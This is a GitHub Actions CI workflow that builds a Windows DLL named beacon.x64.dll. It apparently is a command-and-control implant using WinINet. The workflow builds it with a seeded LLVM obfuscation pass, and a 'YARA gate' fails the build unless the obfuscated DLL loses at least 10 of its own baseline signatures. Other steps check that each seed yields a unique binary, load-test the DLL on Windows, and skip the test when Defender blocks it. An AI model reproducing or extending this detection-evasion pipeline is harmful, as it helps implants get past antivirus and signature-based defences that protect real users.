name: ci

on:
  push:
  pull_request:
  workflow_dispatch:

env:
  LLVM_VERSION: 19.1.7
  XWIN_VERSION: 0.10.0

jobs:
  msvc:
    name: msvc
    runs-on: windows-2022
    steps:
      - uses: actions/checkout@v4

      - name: Configure
        run: cmake --preset default

      - name: Build
        run: cmake --build --preset default --parallel

      - name: Test
        run: ctest --preset default --output-on-failure

      - name: List artifacts
        shell: pwsh
        run: |
          Get-ChildItem build/out/*.dll, build/out/*.exe, build/out/*.map, build/out/*.obj -ErrorAction SilentlyContinue |
            ForEach-Object { "$($_.Name) $($_.Length)" } | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: msvc-windows-x64
          path: |
            build/out/*.dll
            build/out/*.exe
            build/out/*.map
            build/out/*.obj

  llvm-linux:
    name: llvm
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4

      - name: Cache cross toolchain
        uses: actions/cache@v4
        with:
          path: ~/.llvm-cross
          key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-linux-v1

      - name: Ninja + yara
        run: sudo apt-get update -qq && sudo apt-get install -y ninja-build yara

      - name: Setup LLVM + xwin
        run: bash tools/llvm/setup-host.sh

      - name: Configure baseline (no pass)
        run: |
          set -e
          set -a
          source "$HOME/.llvm-cross/toolpath.env"
          set +a
          cmake -S . -B build-llvm-base -G Ninja \
            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
            -DCMAKE_BUILD_TYPE=Release \
            -DCLANG_CL="$LLVM_CLANG" \
            -DLLD_LINK="$LLVM_LLD" \
            -DXWIN_DIR="$XWIN_SPLAT" \
            -DPython3_EXECUTABLE=python3

      - name: Build baseline beacon.x64
        run: cmake --build build-llvm-base --parallel --target beacon_wininet

      - name: Configure mutated seed 1337
        run: |
          set -e
          set -a
          source "$HOME/.llvm-cross/toolpath.env"
          set +a
          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
          cmake --preset llvm \
            -DCLANG_CL="$LLVM_CLANG" \
            -DLLD_LINK="$LLVM_LLD" \
            -DXWIN_DIR="$XWIN_SPLAT" \
            -DBEACON_OBF=ON \
            -DBEACON_OBF_SEED=1337 \
            -DLLVM_DIR="$LLVM_DIR"

      - name: Build mutated product
        run: cmake --build --preset llvm --parallel

      - name: spawn_trace path absent in llvm DLL
        run: |
          cmake -DDLL="$PWD/build-llvm/out/beacon.x64.dll" \
            -P cmake/check_spawn_trace_off.cmake

      - name: YARA gate (baseline >=12 self-match, mutated loses >=10)
        run: |
          set -e
          python3 tools/llvm/gen_yara.py \
            build-llvm-base/out/beacon.x64.dll \
            build-llvm-base/out/beacon.x64.map \
            "$RUNNER_TEMP/bw_baseline.yar"
          BM=$(yara -w "$RUNNER_TEMP/bw_baseline.yar" build-llvm-base/out/beacon.x64.dll | grep -c bw_sig || true)
          echo "yara baseline matches: $BM"
          [ "$BM" -ge 12 ] || { echo "YARA FAIL: baseline does not match its own signatures ($BM)"; exit 1; }
          MM=$(yara -w "$RUNNER_TEMP/bw_baseline.yar" build-llvm/out/beacon.x64.dll | grep -c bw_sig || true)
          echo "yara mutated matches: $MM (of $BM)"
          LOST=$((BM - MM))
          [ "$LOST" -ge 10 ] || { echo "YARA FAIL: mutation lost only $LOST of $BM signatures"; exit 1; }
          echo "yara coverage OK: lost $LOST of $BM"

      - name: Same-seed determinism
        run: |
          set -e
          set -a
          source "$HOME/.llvm-cross/toolpath.env"
          set +a
          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
          A_SHA=$(sha256sum build-llvm/out/beacon.x64.dll | awk '{print $1}')
          echo "A_SHA=$A_SHA"
          cmake -S . -B build-llvm-det -G Ninja \
            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
            -DCMAKE_BUILD_TYPE=Release \
            -DCLANG_CL="$LLVM_CLANG" \
            -DLLD_LINK="$LLVM_LLD" \
            -DXWIN_DIR="$XWIN_SPLAT" \
            -DPython3_EXECUTABLE=python3 \
            -DBEACON_OBF=ON \
            -DBEACON_OBF_SEED=1337 \
            -DLLVM_DIR="$LLVM_DIR"
          cmake --build build-llvm-det --parallel --target beacon_wininet
          B_SHA=$(sha256sum build-llvm-det/out/beacon.x64.dll | awk '{print $1}')
          echo "B_SHA=$B_SHA"
          if [ "$A_SHA" != "$B_SHA" ]; then
            echo "DETERMINISM FAIL A vs B: $A_SHA vs $B_SHA"
            exit 1
          fi
          echo "determinism OK"

      - name: Seed 424242 uniqueness
        run: |
          set -e
          set -a
          source "$HOME/.llvm-cross/toolpath.env"
          set +a
          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
          A_SHA=$(sha256sum build-llvm/out/beacon.x64.dll | awk '{print $1}')
          BASE_SHA=$(sha256sum build-llvm-base/out/beacon.x64.dll | awk '{print $1}')
          cmake -S . -B build-llvm-s2 -G Ninja \
            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
            -DCMAKE_BUILD_TYPE=Release \
            -DCLANG_CL="$LLVM_CLANG" \
            -DLLD_LINK="$LLVM_LLD" \
            -DXWIN_DIR="$XWIN_SPLAT" \
            -DPython3_EXECUTABLE=python3 \
            -DBEACON_OBF=ON \
            -DBEACON_OBF_SEED=424242 \
            -DLLVM_DIR="$LLVM_DIR"
          cmake --build build-llvm-s2 --parallel --target beacon_wininet
          C_SHA=$(sha256sum build-llvm-s2/out/beacon.x64.dll | awk '{print $1}')
          echo "BASE_SHA=$BASE_SHA A_SHA=$A_SHA C_SHA=$C_SHA"
          if [ "$A_SHA" = "$C_SHA" ]; then
            echo "UNIQUENESS FAIL: different seed gave identical output"
            exit 1
          fi
          if [ "$BASE_SHA" = "$C_SHA" ]; then
            echo "BASELINE COLLISION with seed 424242"
            exit 1
          fi
          if [ "$BASE_SHA" = "$A_SHA" ]; then
            echo "BASELINE COLLISION with seed 1337"
            exit 1
          fi
          echo "uniqueness OK"

      - name: List artifacts
        if: always()
        run: ls -la build-llvm/out build-llvm-base/out 2>/dev/null || true

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: llvm-linux-x64
          path: |
            build-llvm/out/*.dll
            build-llvm/out/*.map
            build-llvm-base/out/beacon.x64.dll
            build-llvm-base/out/beacon.x64.map
            build-llvm-det/out/beacon.x64.dll
            build-llvm-s2/out/beacon.x64.dll

  llvm-windows:
    name: llvm-windows
    needs: llvm-linux
    runs-on: windows-2022
    steps:
      - uses: actions/checkout@v4

      - name: Download mutated linux artifacts
        uses: actions/download-artifact@v4
        with:
          name: llvm-linux-x64
          path: mutated

      - name: Setup MSVC (x64)
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      - name: Build load_smoke
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force -Path tests\_build | Out-Null
          & cl /nologo /W3 /EHsc /MT tests\load_smoke.cpp /Fe:tests\_build\load_smoke.exe /Fo:tests\_build\
          if ($LASTEXITCODE -ne 0) { throw "load_smoke build failed" }

      - name: load_smoke mutated DLL
        shell: pwsh
        run: |
          $dll = Get-ChildItem mutated -Recurse -Filter beacon.x64.dll |
            Where-Object { $_.FullName -match 'build-llvm[\\/]out[\\/]beacon\.x64\.dll$' } |
            Select-Object -First 1
          if (-not $dll) { Get-ChildItem mutated -Recurse | Select-Object FullName; throw "mutated beacon.x64.dll not in artifact" }
          Write-Host "mutated dll $($dll.FullName) $($dll.Length) bytes"
          & tests\_build\load_smoke.exe $dll.FullName
          if ($LASTEXITCODE -eq 125) {
            Write-Host "load_smoke skipped (Defender 225/226)"
            exit 0
          }
          if ($LASTEXITCODE -ne 0) { throw "load_smoke failed: $LASTEXITCODE" }
          "DLL=$($dll.FullName)" >> $env:GITHUB_ENV

      - name: spawn_trace path absent
        run: cmake -DDLL="${{ env.DLL }}" -P cmake/check_spawn_trace_off.cmake
